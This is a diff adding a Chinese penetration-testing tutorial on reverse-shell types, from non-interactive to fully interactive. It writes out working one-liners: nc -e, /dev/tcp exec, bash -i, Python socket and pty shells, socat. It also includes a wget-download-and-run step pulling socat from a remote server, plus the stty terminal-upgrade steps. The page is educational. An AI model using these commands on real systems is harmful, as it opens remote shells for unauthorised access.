@@ -90,17 +90,217 @@ client向server发送请求，server将命令内容响应给client,client 获取
 
 ![](../../.gitbook/assets/image%20%28441%29.png)
 
+这种反弹 shell 在渗透测试中比较常见，举两个典型示例：
 
+1、NC反弹
+
+在控制端运行 `nc -lvp 8080` , 在被控端运行 `nc -e /bin/sh 127.0.0.1 8080` , 在控制端运行 history 是没有任何反应的。
+
+![](../../.gitbook/assets/image%20%28458%29.png)
+
+观察一下被控端反弹的 bash ，它的输入输出都连接着管道，同时其他句柄绑定有网络连接。
+
+![](../../.gitbook/assets/image%20%28455%29.png)
+
+2、EXEC反弹
+
+再试一下 exec 反弹的 bash ，被控端运行如下命令，控制端命令如上。
+
+```text
+exec /bin/sh 0</dev/tcp/127.0.0.1/8080 1>&0 2>&0
+```
+
+连通状态和 nc 反弹是类似的， sh 的输入输出句柄都有网络连接 , 从而保证了网络与命令之间的实时连通
+
+![](../../.gitbook/assets/image%20%28457%29.png)
+
+当然为了保证网络与命令之间的实时连通 也不一定全是这种情况，大家可以了解一下 select ， epoll 机制
 
 ### 3、半交互式
 
+上面讲解了非交互式，更进一步，聊一下半交互式。半交互式，大家可能没有太多的概念，但是使用的时候还是挺多的，例 如 bash -i 这种类型的反弹，其实属于半交互式。对半交互式 shell 的定义： 半交互式反弹 shell 有上下文，但相比终端交互 能力弱，如何判断是否是半交互式 shell ，运行两个命令就可以知道： 
 
+1. 运行 history 命令，有输出 
+2. 运行 top 命令，无输出。 
+
+至于如何产生半交互式反弹 shell ，常见的有如下两种办法，我们依次试一下
+
+1、在连通类非交互式反弹 shell 中，运行 `bash -i`
+
+在上一节的基础上，控制端运行 bash -i , 我们看到受控端机器上的当前路径被映射到了本地
+
+![](../../.gitbook/assets/image%20%28446%29.png)
+
+接着运行 history 命令，为了方面截图，使用 grep 进行了过滤
+
+![](../../.gitbook/assets/image%20%28452%29.png)
+
+最后运行 top, 报了 `top: failed tty get` 这个错误，无法获取一个终端，这也是我将它定义为半交互式的原因
+
+![](../../.gitbook/assets/image%20%28447%29.png)
+
+2、直接反弹 bash -i
+
+```text
+bash -i >& /dev/tcp/127.0.0.1/8080 0>&1
+
+/bin/bash -i > /dev/tcp/127.0.0.1/8080 0<& 2>&1
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
 
 ### 4、交互式
 
+半交互式反弹 shell 虽然有了一定程度的交互能力，但距离一个终端还是有很大的距离，为了提高交互能力，将半交互式提升 为交互式，我们需要引入伪终端 pty 。引入伪终端，不仅增强了交互能力，而且有了更强的对抗能力。生成交互式反弹 shell 常见的有两种方式，一种是直接反弹 pty ，另一种是在普通反弹 shell 中生成 pty 。
 
+#### 1、直接反弹 pty
+
+在 Python 中有一个 pty 的包，专门用来生成伪终端，我们可以使用 pty 反弹 bash ，并与之绑定
+
+```text
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+
+在控制端输入 top 命令，看看是否有动态输出：
+
+![](../../.gitbook/assets/image%20%28449%29.png)
+
+接着查看反弹 bash 的输入输出上是否有管道或者 socket 绑定，我们发现 pty 反弹 bash 的输入输出和正常一样，这也是和 nc 反弹 不同的点
+
+![](../../.gitbook/assets/image%20%28454%29.png)
+
+#### 2、普通反弹 shell 中生成 pty
+
+这里的普通反弹 shell 指的是连通类非交互式或者半交互式反弹 shell ，利用 python 执行如下命令，即可生成 pty ，相当于把上面 的一句话拆成了两部分使用，还是比较常见的
+
+```text
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+![](../../.gitbook/assets/image%20%28451%29.png)
+
+假如系统中没有 python 环境，比如 docker 容器中，那么使用 script 命令也是可以
 
 ### 5、完全交互式
+
+我们有了交互式的反弹 shell , 已经非常接近正常终端，但是在使用的过程中，还是发现了很多不同，比如无法用 tab 补齐命令 , 无法删除命令， ctrl+c 会直接退出了 shell 。如何才能打造出和正常终端一样操作的反弹 shell 呢？其实还是有办法的
+
+#### 1、socat
+
+socat 是一款优秀的反弹 shell 工具，其生成的反弹 shell 和普通终端一样易用。在控制端运行
+
+```text
+socat file: tty ,raw,echo=0 TCP-L:8080
+```
+
+在被控端运行：
+
+```text
+socat tcp-connect:127.0.0.1:8080 exec:"bash -li",pty,stderr,setsid,sigint,sane
+```
+
+在 socat 反弹 shell 里，使用 tab 补齐 whoami 命令，感觉和正常终端没有什么区别
+
+![](../../.gitbook/assets/image%20%28448%29.png)
+
+在渗透测试中，如果想更好的使用 socat ，大家可以使用下面的脚本生成静态编译的 socat
+
+```text
+https://github.com/andrew-d/static-binaries/tree/master/socat/build.sh
+```
+
+然后将 socat 放到 VPS 上，远程下载执行
+
+```text
+wget -q https://xxx.com/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:8080
+```
+
+#### 2、pty + 重置终端
+
+"pty + 重置终端 " 的方式真的很奇妙， 强制反弹 shell 匹配控制端的本地终端。在控制端：
+
+1、首先检查当前终端和 STTY 信息
+
+```text
+echo $TERM
+stty -a
+```
+
+2、nc 开启监听
+
+```text
+nc -lvp 8080
+```
+
+![](../../.gitbook/assets/image%20%28453%29.png)
+
+在被控端，只需要使用一个普通的反弹 shell 连接到控制端即可，剩下的工作在控制端做就可以了
+
+3、启用 python 交互式
+
+```text
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+4、把它丢到后台挂起
+
+```text
+ctrl + z
+```
+
+5、重置 stty ，也就意味着你看不到输入的内容
+
+```text
+stty raw -echo
+```
+
+6、把后台挂起的程序调回前台，这个时候在终端看不到 fg 的
+
+```text
+ fg
+```
+
+7、完全刷新终端屏幕
+
+```text
+reset
+```
+
+8、接下来设置环境变量，根据第一步得到的环境变量来设置
+
+```text
+export SHELL=bash
+export TERM=xterm
+stty rows 42 columns 162
+```
+
+最后的效果如下，继续使用 tab 补全 whoami 命令
+
+![](../../.gitbook/assets/image%20%28450%29.png)
+
+最后推荐一个收集反弹 shell 的网站： https://krober.biz/misc/reverse\_shell.php?ip=127.0.0.1&port=8888 ，里面常见的反弹 shell 都可以看到
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
